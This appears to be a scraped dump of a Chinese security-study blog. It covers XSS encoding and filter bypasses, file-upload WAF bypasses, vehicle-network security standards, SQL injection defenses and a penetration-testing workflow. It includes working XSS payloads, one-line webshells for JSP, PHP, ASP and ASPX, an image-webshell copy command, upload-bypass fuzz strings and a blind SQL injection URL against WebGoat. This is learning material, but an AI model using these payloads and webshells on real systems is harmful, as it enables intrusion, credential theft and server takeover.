注意事项：只有在标签内的script代码才能编码，首先经过unicode编码，然后再去url编码那里，编码后才算完成！ &lt;a href=javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(1)&gt;Click&lt;/a&gt; URL编码 &lt;a href=javascript:%2561%256c%2565%2572%2574%2528%2531%2529&gt;Click&lt;/a&gt; HTML实体编码 123456空格 &amp;nbsp; &amp;#160; &amp;#x20;&lt; &amp;lt; &amp;#60; &amp;#x3c;&gt; &amp;gt; &amp;#62; &amp;#x3e;&amp; &amp;amp; &amp;#38; &amp;#x26;&quot; &amp;quot; &amp;#34; &amp;#x22;&#x27; &amp;apos; (IE不支持) &amp;#39; &amp;#x27; 第二个就是十进制实体编码，使用&amp;开头； 1&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt; 第三个就是十六进制实体编码，使用&amp;#x开头，后面的数字跟URL编码是一样的。 需要注意的是，他需要;才能工作。例如&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt; 以上三种编码是可以组合起来的：Unicode URL HTML JavaScript编码 三个八进制数字，如果不够个数，前面补0，例如“&lt;”编码为“\\074” 两个十六进制数字，如果不够个数，前面补0，例如“&lt;”编码为“\\x3c” 四个十六进制数字，如果不够个数，前面补0，例如“&lt;”编码为“\\u003c” 对于一些控制字符，使用特殊的C类型的转义风格（例如\\n和\\r） 在javascript伪协议中可以用（javascript中只识别几种编码：Jsunicode js8进制 js16进制）。 base64编码 在Data协议的时候使用 遇到如下标签： &lt;a href=&quot;可控&quot;&gt; &lt;iframe src=&quot;可控&quot;&gt; &lt;object data=“可控&quot;&gt; 这个时候如果过滤了&lt;&gt;'&quot;JavaScript的话，则可以使用&lt;img src=x οnerrοr=alert(1)&gt;编码成：PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==，然后使用data协议代入可控点： 1&lt;a href=“data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”&gt;111&lt;/a&gt; 请求头注入：如referer和user-agent等等，都是可以利用的。只要它把这些值放到网页上，就可以利用！ 字符绕过： 空格：换行符%0a。换行时必须用单双引号围住，否则不会跳过。跳过回车和换行,不支持on事件 /：这个时候就不能用闭合标签了，可以使用非闭合的标签如img和a 引用外部资源，即src。 HttpOnly禁止读Cookie httponly：如果给某个 cookie 设置了 httpOnly 属性，则无法通过 JS 脚本读取到该 cookie 的信息，但还可以在 Application 中手动修改 cookie，所以只是在一定程度上可以防止 XSS 攻击，不是绝对的安全。虽然设置了httponly之后拿不到cookie，但是还是存在xss跨站语句，阻止的仅仅是获取cookie。 下面是设置HTTP-only cookie的一个报头的示例： 1Set-Cookie: USER=123; expires=Wednesday, 09-Nov-99 23:12:40 GMT; HttpOnly 绕过： 浏览器未保存帐号密码：需要 xss 产生登录地址（漏洞产生在登录界面），利用表单劫持 设置XSS平台的时候选择：获得对应输入框的明文账号密码，然后去看源码中输入框的type和name之类的参数，设置好就可以传这个XSSpayload进去。 浏览器保存帐号密码：浏览器读取帐号密码 WAF拦截与绕过 标签语法替换 提交方式更改，GET/POST 垃圾数据溢出 加密解密算法 结合其他漏洞绕过 其他 WEBSHELL盒子 有webshell中的webshell，当你利用他的大马传入到一个受害主机上，那么一旦你运行该马，那么这个马就会自动传受害者主机地址，利用的账号密码到他提前设置好的主机上。这样子，写这个马的人就 坐收渔翁之利 ！ 他一般会有一些代码，里面写了什么服务器信息啥的，可以仔细看看，但是他如果一旦混淆了，你就看不到了。 如何探测这个是不是有后门？ 看一下有没有莫名其妙的数据包（用F12），抓包也行。在数据包有没有向外发送数据包，有个莫名其妙的你不懂的IP地址/URL 那么如何反杀？我们可以传一个存储型XSS进去，链上我们的XSS平台，进行黑吃黑吃黑！ 资源 http://xss.fbisb.com/ https://github.com/tennc/webshell https://www.postman.com/downloads/ https://pan.baidu.com/s/1lIUZvEVXs1du-Bmkt7-abA 提取码：xiao https://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw 提取码：xiao Cookie与Session对于XSS的影响 小迪说：如果对方使用session验证，那么我们的xss平台是抓不到它的session的，因为session是存储在服务器的。 **实战webgoat测试：**http://127.0.0.1:8080/WebGoat/start.mvc#lesson/CrossSiteScripting.lesson/6 在传入我们的XSS平台代码时，是可以接收到他的JSESSION的！ 但是怎么利用呢？暂时不知道，经过BURP抓包发现他访问上面的网址会经过各种mvc，例如WebGoat/service/lessonoverview.mvc 之类的，最终到达/WebGoat/start.mvc，/WebGoat/service/lessonmenu.mvc，…，lesson 修复方案 开启 httponly,输入过滤，输出过滤等 PHP:http://www.zuimoge.com/212.html JAVA:https://www.cnblogs.com/baixiansheng/p/9001522.html 使用ESAPI，首先应当配置过滤器；其次将过滤器注册到web.xml文件中；最后配置Request的包装类 附录 资源 https://xss8.cc/xss.php?do=login https://xsshs.cn/xss.php?do=login https://github.com/do0dl3/xss-labs http://down.chinaz.com/soft/37581.htm 工具： 自动化工具：https://github.com/s0md3v/XSStrike 参考 绕过：https://www.ddosi.org/xss-bypass/#绕过WAF的方法——跨站脚本 绕过：https://www.cnblogs.com/H4ck3R-XiX/p/12732356.html DOM型XSS漏洞挖掘——trick函数 Sources document.URL document.URLUnencoded document.location（及其许多属性） document.referrer window.location（及其许多属性） location location.href location.search location.hash location.pathname Sinks 直接执行脚本类 eval(…) window.execScript(…) window.setInterval(…) window.setTimeout(…) 写HTML页面类 document.write(…) document.writeln(…) element.innerHTML(…) 直接修改DOM类 document.forms[0].action=… (and various other collections) document.attachEvent(…) document.create…(…) document.execCommand(…) document.body. … (accessing the DOM through the body object) window.attachEvent(…) 替换文档URL类 document.location=… (and assigning to location’s href, host and hostname) document.location.hostname=… document.location.replace(…) document.location.assign(…) document.URL=… window.navigate(…) 打开/修改窗口类 document.open(…) window.open(…) window.location.href=… (and assigning to location’s href, host and hostname)","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://j3f5.github.io/tags/XSS/"}]},{"title":"文件上传进阶-waf绕过及安全修复","slug":"文件上传进阶-waf绕过及安全修复","date":"2023-05-30T07:22:30.000Z","updated":"2023-05-30T07:22:30.000Z","comments":true,"path":"articles/2023/05/30/文件上传进阶-waf绕过及安全修复/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/30/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%BF%9B%E9%98%B6-waf%E7%BB%95%E8%BF%87%E5%8F%8A%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/","excerpt":"","text":"上传参数名解析：明确哪些参数名可以修改 content-Disposition:一般可更改（form-data）接受表单的数据 name:表单参数值，不能更改 filename:文件名，可以更改 connect-Type：文件MIME，试情况而定 常见绕过方法 数据溢出-防止匹配（xxx...）也就是垃圾数据使得WAF无法匹配 Content-Disposition: form-data; **大量垃圾数据**; name=“upload_file” ; 大量垃圾数据; filename=&quot; xxxx&quot; 拦截继续，拦截就继续加。但是可能会上传失败，上传失败就不好用了 符号变异-防匹配（' &quot; ;）匹配''以及&quot;&quot;里面的内容，没匹配到，所以绕过 safedog匹配文件名的原则，应该是在“xxxx” ‘xxxx’ 双引号或单引号之间的。双引号在后面的时候，被安全狗拦截，说明匹配的是后面的双引号，(或者单引号),之前的文件名 数据截断-防匹配（%00 ; 换行） 换行后，安全狗匹配的就是 1234x.p\\nph\\npx.\\np\\nph\\npx\\n.\\np\\nph\\np\\nx\\n.\\np\\nph\\np 重复数据-防匹配（参数多次） 主要是绕过狗子，然后进行绕过 白名单概念 过滤filename中的值，就把数据包的一些数据名称（白名单概念）插入到其中 filename=&quot; Content-Disposition: form-data; name=“upload_file” ; x.php&quot; Content-Disposition： form-data； name=“upload_file” ; x.php 安全狗认为：当检测Filename的时候，由于递归关系，继续检测，因为x.php跟在了之前的Content-Disposition： form-data； name=&quot;upload_file&quot;的后面，而不是filename的值，所以他认为是无用数据，但是在数据包中x.php确实在“xxxxx” 双引号之间，所以会被成功上传。 怎么去学习绕过waf 因为WAF都是基于数据包检测的，所以你得知道WAF是怎么匹配我们的数据包的，就拿上面的例子来说。 大量脏数据：可能就是waf匹配机制只是匹配前多少多少字节，然后后面就不匹配了 ; filename等识别：看正则匹配的条件，也就是绕过正则，一般改动不会影响数据上传的话，就直接该（参考可以改什么） 只要清楚WAF的机制，那么我们学起来就会一通百通！ 再举个例子，如果waf是检测filename=&quot;&quot;的最后一个&quot;，那么，只要我们这样构造：filename=&quot;sss&quot;s.php他就不拦截了，会保存为s.php。 但是需要注意的是，你上传的必须都要是可以执行的php文件，因为解析漏洞可不是那么好找的！ 修复 后端验证：采用服务端验证模式 后缀检测：基于黑名单，白名单过滤 MIME 检测：基于上传自带类型检测 内容检测：文件头，完整性检测 自带函数过滤：参考 uploadlabs 函数 自定义函数过滤：function check_file(){} WAF 防护产品：宝塔，云盾，安全公司产品等 资源 字典 https://github.com/fuzzdb-project/fuzzdb https://github.com/TheKingOfDuck/fuzzDicts FUZZ 12345678filename=x.phpfilename=&quot;x.phpfilename=&#x27;x.phpfilename=&quot;a.jpg;.php&quot;;filename=&quot;a.php%00.jpg&quot;filename=&quot;connect-disposition:from-data;name=&quot;upload_file&quot;;x.php&quot;filename=&quot;x.jpg&quot;;filename=&quot;x.jpg&quot;;.....filename=&quot;x.php&quot;;","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://j3f5.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"车联网基础-标准解读与威胁建模","slug":"车联网基础-标准解读与威胁建模","date":"2023-05-30T03:26:16.000Z","updated":"2023-06-15T03:26:16.000Z","comments":true,"path":"articles/2023/05/30/车联网基础-标准解读与威胁建模/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/30/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E6%A0%87%E5%87%86%E8%A7%A3%E8%AF%BB%E4%B8%8E%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/","excerpt":"","text":"法规/标准汇总 条目 具体条目 备注 ISO-21434-2021 道路汽车——网络安全 ISO-24089-2022 道路汽车——软件升级工程 R155E 网络安全管理制度 R156E 车辆软件更新和软件更新管理系统 GBT40855-2021 汽车网关信息安全技术要求及试验方法 GBT40856-2021 车载信息交互系统信息安全技术要求及试验方法 GBT40857-2021 电动汽车远程服务与管理系统信息安全技术要求及试验方法 车辆的信息化架构（组件+控件） 项目边界示例和前照灯系统的初步架构 车载各类网关的不同构造 CAN网关 以太网网关 混合网关 车载信息交互系统 车辆各类总线协议分布 车联网系统组成 从云端角度：车联网联车平台、车联网服务平台、OTA平台 从车端角度：T-BOX、车机、汽车网络架构 车载终端、车辆企业平台与公共平台间的数据通信。 测试要求与对象一般包括： 硬件/固件、软件系统、日志 网络端口传输、远程升级 数据存储 车载终端的安全需求 硬件： 不存在后门与隐蔽接口 调试接口应禁用或设置安全访问控制 平台间的安全需求 https://blog.csdn.net/ananas_orangey/article/details/119461914 https://www.cnblogs.com/tomyyyyy/p/17174932.html https://zhuanlan.kanxue.com/article-16906.htm https://supergate.top/2021/04/06/车联网安全测试入门总结/车联网安全测试入门总结/ https://www.ctfiot.com/23461.html https://www.eet-china.com/mp/a167077.html","categories":[{"name":"车联网基础","slug":"车联网基础","permalink":"https://j3f5.github.io/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"车联网标准","slug":"车联网标准","permalink":"https://j3f5.github.io/tags/%E8%BD%A6%E8%81%94%E7%BD%91%E6%A0%87%E5%87%86/"}]},{"title":"SQL注入进阶-防御措施与代码级安全","slug":"SQL注入进阶-防御措施与代码级安全","date":"2023-05-30T03:16:46.000Z","updated":"2023-05-30T03:16:46.000Z","comments":true,"path":"articles/2023/05/30/SQL注入进阶-防御措施与代码级安全/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/30/SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD%E4%B8%8E%E4%BB%A3%E7%A0%81%E7%BA%A7%E5%AE%89%E5%85%A8/","excerpt":"","text":"PHP 防御 对数据类型进行检查和转义/预编译 magic_quotes_gpc = On 预处理查询 (Prepared Statements) 使用prepared statements（预处理语句）和参数化的查询，可以有效的防止sql注入。 使用mysqli:prepare()实现。也是用?占位符实现 123$stmt = $dbConnection-&gt;prepare(&#x27;SELECT * FROM employees WHERE name = ?&#x27;);$stmt-&gt;bind_param(&#x27;s&#x27;, $name); // &#x27;s&#x27; specifies the variable type =&gt; &#x27;string&#x27;$stmt-&gt;execute(); 使用pdo实现。默认情况下，PDO会使用DSN中指定的字符集对输入参数进行本地转义 12$stmt = $pdo-&gt;prepare(&#x27;SELECT * FROM employees WHERE name = :name&#x27;);$stmt-&gt;execute([ &#x27;name&#x27; =&gt; $name ]); 隐藏错误信息 php.ini 中的 display_errors 选项，应该设为 display_errors = off。这样 php 脚本出错之后，不会在 web 页面输出错误，以免让攻击者分析出有作的信息。 调用 mysql_query 等 mysql 函数时，前面应该加上 @，即 @mysql_query(…)，这样 mysql 错误不会被输出。同理以免让攻击者分析出有用的信息 https://segmentfault.com/a/1190000008117968 JAVA JDBC 拼接不当造成SQL 注入 JDBC 有两种方法执行SQL 语句，分别为PrepareStatement 和Statement。两个方法的区别在于PrepareStatement 会对SQL 语句进行预编译，而Statement 方法在每次执行时都需要编译，会增大系统开销。 理论上PrepareStatement 的效率和安全性会比Statement 要好，但并不意味着使用PrepareStatement 就绝对安全，不会产生SQL注入。正确地使用PrepareStatement 可以有效避免SQL 注入的产生，使用 ? 作为占位符时，填入对应字段的值会进行严格的类型检查。将前面的“拼接构造SQL 语句”改为如下“使用占位符构造SQL 语句”的代码片段，即可有效避免SQL 注入的产生。 123456String sql = &quot;select * from user where id = &quot;+req.getParameter(&quot;id&quot;);out.println(sql);...PreparedStatement pstt = con.prepareStatement(sql);ResultSet rs = pstt.executeQuery();... 1234567PrintWriter out = resp.getWriter();String sql = &quot;select * from user where id = ?&quot;; //使用了占位符out.println(sql);...PreparedStatement pstt = con.prepareStatement(sql);pstt.setInt(1, Integer.parseInt(req.getParameter(&quot;id&quot;)));ResultSet rs = pstt.executeQuery(); 框架SQL注入 如今的 Java 项目或多或少会使用对 JDBC 进行更抽象封装的持久化框架，如 MyBatis 和 Hibernate。常见的框架SSH（Struts2+Spring+Hibernate）和SSM（Spring MVC+Spring+MyBatis）分别指的就是以上两个框架 MyBatis MyBatis 框架的思想是将SQL 语句编入配置文件中，避免SQL 语句在Java 程序中大量出现，方便后续对SQL 语句的修改与配置。 MyBatis中使用parameterType向SQL 语句传参，在SQL引用传参可以使用#&#123;Parameter&#125;和$&#123;Parameter&#125;两种方式。 #与$的区别 总的来说就是#是预编译，但是$不是。 使用#&#123;Parameter&#125;构造SQL 的代码 1234&lt;select id=&quot;getUsername&quot; resultType=&quot;com.z1ng.bean.User&quot;&gt;select id,name,age from user where name = #&#123;name&#125;&lt;/select&gt;Preparing: select id,name,age from user where name = ? //生成的语句 从Debug 回显的SQL语句执行过程可以看出，使用#&#123;Parameter&#125;方式会使用“?”占位进行预编译，因此此时不存在SQL 注入。 使用$&#123;Parameter&#125;构造SQL 的代码 1234&lt;select id=&quot;getUsername&quot; resultType=&quot;com.z1ng.bean.User&quot;&gt;select id,name,age from user where name = #&#123;name&#125;&lt;/select&gt;Preparing: select id,name,age from user where name = &#x27;z1ng&#x27; //生成的语句 从上面的演示可以看出，在底层构造完整SQL 语句时，MyBatis的两种传参方式所采取的方式不同。#{Parameter}采用预编译的方式构造SQL，避免了SQL 注入的产生。而$&#123;Parameter&#125;采用拼接的方式构造SQL，在对用户输入过滤不严格的前提下，此处很可能存在SQL 注入。 Hibernate Hibernate 框架是Java 持久化API（JPA）规范的一种实现方式。Hibernate将Java类映射到数据库表中，从 Java 数据类型映射到 SQL 数据类型。 其使用HQL作为语言与数据库进行交互，HQL的语法与SQL类似，但有些许不同。受语法的影响，HQL注入在实际漏洞利用上具有一定的限制。Hibernate 是对持久化类的对象进行操作而不是直接对数据库进行操作，因此HQL 查询语句由Hibernate 引擎进行解析，这意味着产生的错误信息可能来自数据库，也可能来自Hibernate 引擎 1234tx = session.beginTransaction();String parameter = &quot; zaaaa&#x27; or &#x27;1&#x27;=&#x27;1 &quot;;List user = session.createQuery(&quot;FROM User where name=&#x27;&quot;+parameter+&quot;&#x27;&quot;,User.class).getResultList();tx.commit(); 通过Debug 模式可以清晰地观察到变量“parameter”被拼接进语句中，并将原本的语义改变，查询出结果 12from Userwhere name = &#x27;zaaa&#x27;... 正确使用以下几种HQL 参数绑定的方式可以有效避免注入的产生: 位置参数（Positional parameter） 1... where name = ?1; query.setParameter(1, parameter); 命名参数（named parameter） 1String parameter = &quot;z1ng&quot; ; ... where name = :name&quot;; query.setParameter(&quot;name&quot;, parameter); 命名参数列表（named parameter list） 类实例（JavaBean） 防御不当（预编译CASE注入） SQL 注入最主要的成因在于未对用户输入进行严格的过滤，并采取不恰当的方式构造SQL 语句。在实际开发的过程中，有些地方难免需要使用拼接构造SQL 语句，例如SQL语句中order by 后面的参数无法使用预编译赋值。此时应严格检验用户输入的参数类型、参数格式等是否符合程序预期要求。所以会存在 绕过： 通过case when语句可以将order by后的orderExpression表达式中添加select语句 即，即使参数化，但是还是会将注入代码重新写上去。 例子： 存在ORDER BY的请求：http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=ip 则可以构造这个，发起盲注，其中{0}是下标，{1}是ascii 1http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case when (select substr(ip,&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27; from servers where hostname=&#x27;webgoat-prd&#x27;) then hostname else mac end 审计 代码审计的核心思想是追踪参数，而追踪参数的步骤就是程序执行的步骤。因此，代码审计是一个跟踪程序执行步骤的过程，了解了框架的执行流程自然会了解如何如跟踪一个参数，剩下的就是观察在参数传递的过程中有没有一些常见的漏洞点。 全局搜索 首先看pom.xml，看用了什么数据库和什么框架。 然后搜索query()函数，看哪里用到了，就大概看一下。 功能定点 我们可以从程序的具体功能上进行定点的漏洞挖掘，与数据库交互的位置就有可能出现SQL 注入，比如用户信息页面 防御SQL注入 需要分清各种防御针对的对象是谁。 SQL语句的执行代码使用预编译 PreparedStatement （参数绑定）。 利用 session 防御，session 内容正常情况下是用户无法修改的 select * from users where user = &quot;'&quot; +session.getAttribute(&quot;UserID&quot;) + &quot;'&quot;; 存储过程防御 确定每个数据的类型，比如是数字，数据库则必须使用int类型来存储。(这个是用来防什么的？) 限制传入数据的长度，这能够在一定程度上防止sql注入。 严格限制用户使用数据库的权限，能够在一定程度上减少sql注入的危害。 避免直接响应一些 sql 语句执行异常的信息。 过滤参数中含有的一些数据库关键词。","categories":[{"name":"JAVA安全基础","slug":"JAVA安全基础","permalink":"https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"渗透测试基础","slug":"JAVA安全基础/渗透测试基础","permalink":"https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"渗透测试整体流程","slug":"渗透测试整体流程","date":"2023-05-29T14:53:16.000Z","updated":"2023-05-30T01:20:08.000Z","comments":true,"path":"articles/2023/05/29/渗透测试整体流程/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/29/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/","excerpt":"","text":"概述 明确目标 分析风险、获得授权 信息搜集 漏洞探测 漏洞验证 信息分析 利用漏洞 信息整理 形成报告 明确目标 确定范围：测试的范围，如：IP、域名、内外网、整站or部分模块 确定规则：能渗透到什么程度（发现漏洞为止or继续利用漏洞）、时间限制、能否修改上传、能否提权… 目标系统介绍、重点保护对象及特性。 是否允许数据破坏？ 是否允许阻断业务正常运行？ 测试之前是否应当知会相关部门接口人？ 接入方式？外网和内网？ 测试是发现问题就算成功，还是尽可能的发现多的问题？ 渗透过程是否需要考虑社会工程？ 确定需求：web应用的漏洞(新上线程序)？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？根据需求和自己技术能力来确定能不能做、能做多少 分析风险、获得授权 分析渗透测试过程中可能产生的风险，如大量测试数据的处理、影响正常业务开展、服务器发生异常的应急、数据备份和恢复、测试人力物力成本…由测试方书写实施方案初稿并提交给客户（or本公司内部领导）进行审核。在审核完成后，从客户（or本公司内部领导）获取对测试方进行书面委托授权书，授权测试方进行渗透测试。 信息搜集 漏洞利用 利用上一步中列出的信息，使用相应的漏洞检测 方法：1）漏扫：AWVS、AppScan…2）结合漏洞去exploit-db等位置找利用3）在网上寻找验证POC 内容：系统漏洞：系统没有及时打补丁Websever漏洞：Websever配置问题Web应用漏洞：Web应用开发问题其它端口服务漏洞：各种21/8080(st2)/7001/22/3389通信安全：明文传输，token在cookie中传送等 漏洞验证 将上一步中发现的有可能可以成功利用的全部漏洞都验证一遍。结合实际情况，搭建模拟环境进行试验，成功后再应用于目标中。 自动化验证：结合自动化扫描工具提供的结果 手工验证：根据公开资源进行验证 试验验证：自己搭建模拟环境进行验证 登录猜解：有时可以尝试猜解一下登陆口的账号密码等信息 业务漏洞验证：如发现业务漏洞，要进行验证 公开资源的利用exploit-db/wooyun/渗透代码网站通用、缺省口令厂商的漏洞警告等 信息分析 为下一步实施渗透做准备 精准攻击：准备好上一步探测到的漏洞exp（漏洞利用），用来精准攻击 绕过防御机制：是否有防火墙等设备，如何绕过 定制攻击路径：最佳工具路径，根据薄弱入口，高内网权限位置，最终目标 绕过检测机制：是否有检测机制，流量监控，杀毒软件，恶意代码检测等（免杀） 攻击代码：经过试验得来的代码，包括不限于xss代码，sql注入语句等 利用漏洞，获取数据 实施攻击：根据前几步的结果，进行攻击 获取内部信息：基础设施（网络连接，vpn，路由，拓扑等） 进一步渗透：内网入侵，敏感目标 持续性存在：一般对客户做渗透不需要。rookit，后门，添加管理账号，驻扎手法等 清理痕迹：清理相关日志（访问，操作），上传文件等 信息整理 整理渗透工具：整理渗透过程中用到的代码，poc，exp等 整理收集信息：整理渗透过程中收集到的一切信息 整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息 目的：为了最后形成报告，形成测试结果使用。 形成报告 按需整理：按照之前第一步跟客户确定好的范围，需求来整理资料，并将资料形成报告 补充介绍：要对漏洞成因，验证过程和带来危害进行分析 修补建议：当然要对所有产生的问题提出合理高效安全的解决办","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"整体流程","slug":"整体流程","permalink":"https://j3f5.github.io/tags/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/"}]},{"title":"文件上传基础","slug":"文件上传基础","date":"2023-05-29T02:29:28.000Z","updated":"2023-05-30T01:16:44.000Z","comments":true,"path":"articles/2023/05/29/文件上传基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/","excerpt":"","text":"文件上传基础 利用思路 补充 一般上传代码 代码内容：其中 uploadfile 就是上传文件的实例，然后通过$_FILE来对文件信息进行读取，然后进行判断，是对应的！！！ 1234567891011&lt;?phpecho $_FILE[&#x27;uploadfile&#x27;][&#x27;name&#x27;];echo $_FILE[&#x27;uploadfile&#x27;][&#x27;type&#x27;] != &quot;image/png&quot;;// 这个move...函数需要重点注意，是上传的重要函数move_uploaded_file($_FILE[&#x27;uploadfile&#x27;][&#x27;name&#x27;], &#x27;../upload/&#x27;.$_FILE[&#x27;uploadfile&#x27;][&#x27;name&#x27;]);?&gt;&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; action=&quot;&quot;&gt;&lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;uploadfile&quot;/&gt;&lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot;/&gt;&lt;/form&gt; 文件上传漏洞如何查找及判断？ 黑盒查找。文件后台、会员中心、文件扫描。 一般可以通过url搜索上传界面 site：easyicon.net upload或inurl:upload.php 文件后台 进入网站后台不一定获得网站权限，可以从后台获取网站权限（后台拿webshell） 会员中心 通过图片上传 文件扫描 使用工具扫描出后台路径 白盒查找。通过代码分析到上传漏洞、查找文件上传功能。 对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期测试。 注入点失败： 上传后没有返回路径（如果知道CMS类型那就好办） 上传失败 一句话木马 jsp：&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt; php：&lt;?php @eval($_POST['h4ck']) ?&gt; asp：&lt;%eval request ('h4ck')%&gt; aspx：&lt;%@ Page Language='Jscript'%&gt; &lt;%eval(Request.Item['h4ck'],'unsafe');%&gt; 他们还有很多变体，但是都离不开命令执行函数。每种脚本的命令执行函数都有不少。其他的 图片马 jpg：图像以ff d8开头 gif：GIF89a 无敌，在前面加上这个就可以了！不需要什么图片啊啥的！ 然后再加上一句话木马。 也可以使用copy（需要在cmd下），即copy 1.png /b + shell.php /a webshell.jpg 整体思路 先扫目录，到什么会员中心找到上传漏洞点 筛选中间件看有没有解析漏洞 没有的话，进行注入&amp;&amp;绕过 不成功，就去看CMS版本和对应的漏洞 没有类似CMS漏洞，去找编辑器与最近的CVE漏洞 漏洞与绕过 JS前端绕过 关闭前端js即可 文件类型（黑名单绕过） 大小写/双写绕过 文件名：也就是后缀名。包括黑白名单等。 绕过：Php大小写、pphphp双写 其他特殊后缀绕过 .phtml .php5 上传函数绕过(./绕过) 上传函数：move_uploaded_file函数会忽略掉文件末尾的/. 绕过：可以构造save_path=1.php/.，这样file_ext值就为空，就能绕过黑名单，而move_uploaded_file函数忽略文件末尾的/.可以实现保存文件为.php 空格、点绕过(windows) 当接收文件时，后台代码的限制条件中没有去除文件名首尾的空格(或是没有对.进行拆分)时，可以利用windows系统的命名规则进行绕过：如，将文件后缀改为xxx.php、xxx.php.、xxx.php . 在windows下xx.jpg[空格] 或xx.jpg.这两类文件是不允许存在的，若这样命名，windows会默认去除空格或点 还有些情况具体就需要看代码逻辑，比如如果代码只删除一次点且只去除一次首尾空格，在windows环境下就可以用xxx.php. .进行绕过 ::$DATA绕过(windows) ::$DATA绕过同样利用了windows的特性 NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。 即在php+windows的环境下,如果文件名+::$DATA会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名。 .htaccess绕过（详细见后） .user.ini绕过（详细见后） 解析漏洞绕过（详细见后） 文件检测（白名单） MIME content-type绕过 文件类型：MIME类型，MIME类型就是image/png之类的content-type 涉及函数mime_content_type MIME类型：image/png、audio/mpeg # mp3 %00截断（详细见后） 00截断绕过方式需要满足以下条件 1php版本小于5.3.4``php.ini的magic_quotes_gpc为OFF状态``使用move_uploaded_file函数且参数受用户控制 此时move_uploaded_file函数遇到0x00会截断 可以将上传文件后缀改为xx.php%00进行绕过 %0a绕过 %0a绕过方式需要满足以下条件 1Apache httpd 2.4.0至2.4.29``FileMatch正则匹配.php|.php5等后缀 该版本apache会通过$匹配后缀，而$匹配时会正则匹配某字符串结尾或以换行符结尾的一个字符串，即php[换行符]会被匹配成php 可以将上传文件后缀改为xx.php%0a进行绕过 其他 文件头绕过 文件头：内容头消息 涉及函数getimagesize和exif_imagetype函数。 文件头：gif: GIF89a、png: HEX 89 50 4E 47 0D 0A 1A 0A、jpg: HEX FF D8 FF 以上3个函数都是通过检查文件的幻数判断文件的类别。可以直接下列命令制作后门jpg文件进行绕过。 1copy safe.jpg /b + shell.php /a shell.jpg 在该场景下，防御姿势除了基本的黑/白名单外，还包括了对一些特定字符的限制，具体情况可以进行fuzz或者有条件可以进行代码审计 条件竞争/二次渲染绕过（详细见后） 内容逻辑数组绕过与目录命名 此部分将文件名分成3部分组成一个数组,例如将&quot;xx.jpg&quot;分为:“xx”、“.”、&quot;jpg&quot;三部分 其将文件名分为3个部分，分别检测并且拼接。我们可以改数组绕过 我们抓包将.php/.jpg分三部分修改即可绕过，此时第一部分为.php/，第二部分.，第三部分jpg，后面会拼接成：.php/.，因为上面的move_uploadfile会忽略./所以，上传成功。 00截断 